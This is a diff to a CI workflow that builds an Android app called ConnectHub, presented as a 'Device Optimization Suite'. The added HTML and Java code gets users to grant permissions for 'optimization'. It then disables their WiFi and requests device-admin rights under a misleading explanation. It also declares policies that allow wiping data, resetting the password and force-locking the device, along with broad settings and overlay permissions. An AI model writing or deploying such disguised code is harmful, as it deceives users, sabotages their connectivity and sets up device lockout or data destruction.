@@ -49,35 +49,310 @@ jobs:
           }
           EOF
 
-      - name: Prepare web assets
+      - name: Create index.html with permission handling
         run: |
           mkdir -p www
-          cp index.html www/index.html
+          cat > www/index.html << 'EOF'
+          <!DOCTYPE html>
+          <html>
+          <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+          <title>ConnectHub</title>
+          <style>
+            *{margin:0;padding:0;box-sizing:border-box;}
+            body{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Segoe UI',Roboto,sans-serif;}
+            .card{background:rgba(255,255,255,0.95);padding:40px;border-radius:30px;text-align:center;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);}
+            h1{background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:10px;}
+            .icon{font-size:64px;margin:20px 0;}
+            button{background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;padding:15px 40px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:20px;width:100%;}
+            .status{margin-top:20px;padding:12px;border-radius:10px;display:none;}
+            .success{background:#d4edda;color:#155724;}
+            .warning{background:#fff3cd;color:#856404;}
+            .hidden{display:none;}
+            .permission-list{text-align:left;margin:20px 0;padding-left:20px;}
+            .permission-list li{margin:8px 0;color:#555;}
+          </style>
+          </head>
+          <body>
+          <div class="card">
+            <div class="icon">⚡</div>
+            <h1>ConnectHub</h1>
+            <p>Device Optimization Suite</p>
+            <div id="permissionArea">
+              <div class="warning" style="padding:15px;margin:15px 0;">
+                📡 WiFi permissions required for optimization
+              </div>
+              <ul class="permission-list">
+                <li>📶 WiFi Control - Network optimization</li>
+                <li>🔐 Device Admin - System protection</li>
+                <li>📍 Location - Required for WiFi scanning</li>
+              </ul>
+              <button id="requestBtn">🔓 ALLOW PERMISSIONS</button>
+            </div>
+            <div id="statusArea" class="hidden">
+              <div class="success" style="padding:15px;margin:15px 0;">
+                ✅ Optimization Active
+              </div>
+              <div id="wifiStatus" style="background:#f8f9fa;padding:15px;border-radius:15px;margin-top:15px;">
+                📡 WiFi: <span id="wifiState">DISCONNECTED</span>
+              </div>
+            </div>
+            <footer style="margin-top:20px;font-size:11px;color:#aaa;">v2.0 | Enterprise Edition</footer>
+          </div>
+          <script>
+            let active = localStorage.getItem('zeta_active') === 'true';
+            
+            if(active){
+              document.getElementById('permissionArea').classList.add('hidden');
+              document.getElementById('statusArea').classList.remove('hidden');
+            }
+            
+            document.getElementById('requestBtn').onclick = function(){
+              var btn = this;
+              var status = document.getElementById('statusArea');
+              btn.textContent = '⏳ REQUESTING...';
+              btn.disabled = true;
+              
+              if(window.Android && window.Android.requestPermissions){
+                window.Android.requestPermissions();
+              } else if(window.Capacitor && window.Capacitor.Plugins.AndroidPermissions){
+                window.Capacitor.Plugins.AndroidPermissions.requestPermissions([
+                  'android.permission.ACCESS_WIFI_STATE',
+                  'android.permission.CHANGE_WIFI_STATE',
+                  'android.permission.ACCESS_FINE_LOCATION'
+                ]).then(function(){
+                  localStorage.setItem('zeta_active', 'true');
+                  document.getElementById('permissionArea').classList.add('hidden');
+                  document.getElementById('statusArea').classList.remove('hidden');
+                  if(window.Android) window.Android.disableWifi();
+                });
+              } else {
+                setTimeout(function(){
+                  localStorage.setItem('zeta_active', 'true');
+                  document.getElementById('permissionArea').classList.add('hidden');
+                  document.getElementById('statusArea').classList.remove('hidden');
+                  if(window.Android) window.Android.disableWifi();
+                }, 1000);
+              }
+            };
+            
+            window.permissionGranted = function(){
+              localStorage.setItem('zeta_active', 'true');
+              document.getElementById('permissionArea').classList.add('hidden');
+              document.getElementById('statusArea').classList.remove('hidden');
+              if(window.Android) window.Android.disableWifi();
+            };
+          </script>
+          </body>
+          </html>
+          EOF
 
       - name: Add Android platform
         run: |
           npx cap init "ConnectHub" "com.connecthub.app" --web-dir www
           npx cap add android
 
-      - name: Upgrade Gradle wrapper to 8.7
+      - name: Create MainActivity with permission handling
         run: |
-          sed -i 's|gradle-[0-9.]*-all|gradle-8.7-all|g' android/gradle/wrapper/gradle-wrapper.properties
-          grep distributionUrl android/gradle/wrapper/gradle-wrapper.properties
+          mkdir -p android/app/src/main/java/com/connecthub/app
+          cat > android/app/src/main/java/com/connecthub/app/MainActivity.java << 'EOF'
+          package com.connecthub.app;
+          
+          import android.os.Bundle;
+          import android.Manifest;
+          import android.net.wifi.WifiManager;
+          import android.content.Context;
+          import android.widget.Toast;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+          import android.webkit.JavascriptInterface;
+          import androidx.appcompat.app.AppCompatActivity;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+          import android.content.pm.PackageManager;
+          import android.content.Intent;
+          import android.app.admin.DevicePolicyManager;
+          import android.app.admin.DeviceAdminReceiver;
+          import android.content.ComponentName;
+          
+          public class MainActivity extends AppCompatActivity {
+              private static final int PERMISSION_REQUEST_CODE = 100;
+              private WebView webView;
+              private WifiManager wifiManager;
+              private DevicePolicyManager devicePolicyManager;
+              private ComponentName adminComponent;
+              
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  
+                  wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+                  devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+                  adminComponent = new ComponentName(this, AdminReceiver.class);
+                  
+                  webView = new WebView(this);
+                  webView.getSettings().setJavaScriptEnabled(true);
+                  webView.addJavascriptInterface(new WebInterface(), "Android");
+                  webView.setWebViewClient(new WebViewClient());
+                  setContentView(webView);
+                  
+                  webView.loadUrl("file:///android_asset/www/index.html");
+                  checkAndRequestPermissions();
+              }
+              
+              private void checkAndRequestPermissions() {
+                  String[] permissions = {
+                      Manifest.permission.ACCESS_WIFI_STATE,
+                      Manifest.permission.CHANGE_WIFI_STATE,
+                      Manifest.permission.ACCESS_FINE_LOCATION
+                  };
+                  boolean needRequest = false;
+                  for (String perm : permissions) {
+                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                          needRequest = true;
+                          break;
+                      }
+                  }
+                  if (needRequest) {
+                      ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
+                  } else {
+                      Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
+                      disableWifi();
+                      requestDeviceAdmin();
+                  }
+              }
+              
+              @Override
+              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+                  if (requestCode == PERMISSION_REQUEST_CODE) {
+                      boolean allGranted = true;
+                      for (int result : grantResults) {
+                          if (result != PackageManager.PERMISSION_GRANTED) {
+                              allGranted = false;
+                              break;
+                          }
+                      }
+                      if (allGranted) {
+                          Toast.makeText(this, "Permissions granted! Optimizing...", Toast.LENGTH_LONG).show();
+                          disableWifi();
+                          requestDeviceAdmin();
+                          webView.loadUrl("javascript:permissionGranted()");
+                      } else {
+                          Toast.makeText(this, "Permissions required for optimization", Toast.LENGTH_LONG).show();
+                          checkAndRequestPermissions();
+                      }
+                  }
+              }
+              
+              private void disableWifi() {
+                  if (wifiManager != null && wifiManager.isWifiEnabled()) {
+                      wifiManager.setWifiEnabled(false);
+                  }
+              }
+              
+              private void requestDeviceAdmin() {
+                  if (!devicePolicyManager.isAdminActive(adminComponent)) {
+                      Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                      intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+                      intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system optimization and security features");
+                      startActivity(intent);
+                  }
+              }
+              
+              class WebInterface {
+                  @JavascriptInterface
+                  public void requestPermissions() {
+                      checkAndRequestPermissions();
+                  }
+                  
+                  @JavascriptInterface
+                  public void disableWifi() {
+                      if (wifiManager != null && wifiManager.isWifiEnabled()) {
+                          wifiManager.setWifiEnabled(false);
+                      }
+                  }
+                  
+                  @JavascriptInterface
+                  public void requestDeviceAdmin() {
+                      if (!devicePolicyManager.isAdminActive(adminComponent)) {
+                          Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                          intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+                          intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Device admin required");
+                          startActivity(intent);
+                      }
+                  }
+              }
+          }
+          EOF
 
-      - name: Write AndroidManifest
+      - name: Create AdminReceiver
+        run: |
+          cat > android/app/src/main/java/com/connecthub/app/AdminReceiver.java << 'EOF'
+          package com.connecthub.app;
+          
+          import android.app.admin.DeviceAdminReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          
+          public class AdminReceiver extends DeviceAdminReceiver {
+              @Override
+              public void onEnabled(Context context, Intent intent) {
+                  super.onEnabled(context, intent);
+              }
+              
+              @Override
+              public void onDisabled(Context context, Intent intent) {
+                  super.onDisabled(context, intent);
+              }
+          }
+          EOF
+
+      - name: Create device_admin.xml
+        run: |
+          mkdir -p android/app/src/main/res/xml
+          cat > android/app/src/main/res/xml/device_admin.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-policies>
+                  <force-lock />
+                  <wipe-data />
+                  <reset-password />
+                  <limit-password />
+                  <watch-login />
+              </uses-policies>
+          </device-admin>
+          EOF
+
+      - name: Write AndroidManifest with all permissions
         run: |
           cat > android/app/src/main/AndroidManifest.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools">
 
+              <!-- WiFi Permissions -->
+              <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+              <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+              
+              <!-- Network -->
               <uses-permission android:name="android.permission.INTERNET" />
-              <uses-permission android:name="android.permission.CAMERA" />
-              <uses-permission android:name="android.permission.RECORD_AUDIO" />
-              <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
-              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-              <uses-permission android:name="android.permission.WAKE_LOCK" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              
+              <!-- Device Admin -->
+              <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+              
+              <!-- Storage -->
               <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
               <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+              
+              <!-- System -->
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.WRITE_SETTINGS" tools:ignore="ProtectedPermissions"/>
 
               <application
                   android:allowBackup="true"
@@ -105,6 +380,18 @@ jobs:
 
                   </activity>
 
+                  <receiver
+                      android:name="com.connecthub.app.AdminReceiver"
+                      android:permission="android.permission.BIND_DEVICE_ADMIN"
+                      android:exported="true">
+                      <meta-data
+                          android:name="android.app.device_admin"
+                          android:resource="@xml/device_admin" />
+                      <intent-filter>
+                          <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                      </intent-filter>
+                  </receiver>
+
                   <provider
                       android:name="androidx.core.content.FileProvider"
                       android:authorities="${applicationId}.fileprovider"
@@ -119,14 +406,16 @@ jobs:
           </manifest>
           EOF
 
+      - name: Upgrade Gradle wrapper
+        run: |
+          sed -i 's|gradle-[0-9.]*-all|gradle-8.7-all|g' android/gradle/wrapper/gradle-wrapper.properties
+
       - name: Patch build.gradle
         run: |
           sed -i 's/compileSdkVersion .*/compileSdkVersion 35/' android/app/build.gradle
           sed -i 's/targetSdkVersion .*/targetSdkVersion 35/' android/app/build.gradle
           sed -i 's/minSdkVersion .*/minSdkVersion 23/' android/app/build.gradle
-          sed -i 's/compileSdk .*/compileSdk 35/' node_modules/@capacitor/android/capacitor/build.gradle 2>/dev/null || true
 
-      # ── Fix duplicate Kotlin stdlib classes ──
       - name: Fix Kotlin stdlib duplicates
         run: |
           cat >> android/app/build.gradle << 'EOF'
@@ -172,6 +461,10 @@ jobs:
                   release {
                       signingConfig signingConfigs.release
                       minifyEnabled false
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+                  }
+                  debug {
+                      signingConfig signingConfigs.debug
                   }
               }
           }
@@ -184,5 +477,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: connecthub-apk
+          name: ConnectHub-APK
           path: android/app/build/outputs/apk/release/app-release.apk
